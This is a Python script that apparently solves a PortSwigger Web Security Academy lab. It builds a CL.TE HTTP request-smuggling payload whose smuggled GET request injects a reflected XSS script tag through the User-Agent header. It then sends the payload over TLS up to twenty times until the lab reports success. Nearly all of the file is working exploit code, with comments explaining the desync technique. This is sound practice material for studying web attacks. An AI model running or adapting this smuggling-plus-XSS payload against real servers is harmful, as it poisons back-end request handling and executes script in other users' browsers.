import random
import sys
import urllib3
import socket
import ssl
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def CL_TE_XSS_SUMMGLING(target_host,target_port):
        # The User-Agent header is vulnerable to XSS due to its reflection in the response.
        # The front-end server uses Content-Length (CL), while the back-end server uses Transfer-Encoding (TE).
        # A Content-Length of 148 is used to send the entire payload.
        # The back-end interprets the chunked encoding and splits the payload into two requests, with the second request starting after the '0' chunk.
        # A GET request is crafted to target the vulnerable page with the XSS payload.
        # When a user accesses the site, the XSS payload triggers and executes alert(1).

    payload=(
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 148\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /post?postId=5 HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 3\r\n"
        'User-Agent: a"><script>alert(1)</script>\r\n'
        "\r\n"
        "x="
    )
    try:
          # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
        context_ssl=ssl.create_default_context()
         # A while loop is used to send the payload multiple times to ensure that user get xss reflected
        maxLoop=0
        while maxLoop<20:
            maxLoop+=1
            
            #Opens a connection to the server (target_host) on the specified port (target_port).
            with socket.create_connection((target_host,target_port)) as sock:
                 #Wraps the socket connection with encryption for secure data transfer.
                with context_ssl.wrap_socket(sock,server_hostname=target_host) as securesock:
                    print(f"(+) ({maxLoop}) sending payload  .. ")
                    securesock.sendall(payload.encode(errors="ignore",encoding="utf-8"))# send smuggling payload 
                    response=securesock.recv(4096).decode() # receving response 
                    if "HTTP/1.1 200 OK" in response :
   
                        if "Congratulations, you solved the lab!" in response :
                            print('(+) The XSS payload has been successfully reflected .')
                            print("(+) lab solved successfully  .")
                            sys.exit()
                        else:
                            # sleep a seconds befor send another request
                            time.sleep(random.randint(10,20))
                       
                        
                    elif "504 Gateway Timeout" in response:  #check if the host down or not 
                        print("(-) No response received from the server .")
                        sys.exit()

                    else:
                        print('(-) Error !')
                        sys.exit()
        
        print('(!) Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it’s successful.')
        print('(!) In the event of an unexpected occurrence, either rerun the script or obtain a new lab instance. ')
        print('(-) The lab remains unresolved, unfortunately. ')
        
    except  Exception as err:
        print(f'(-) {err}')   
        sys.exit()

def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net'%sys.argv[0])
        sys.exit(1)
    
    target_host=sys.argv[1]
    target_port=443
    print('(+) Starting ...........')
    CL_TE_XSS_SUMMGLING(target_host,target_port)

if __name__=="__main__":
    main()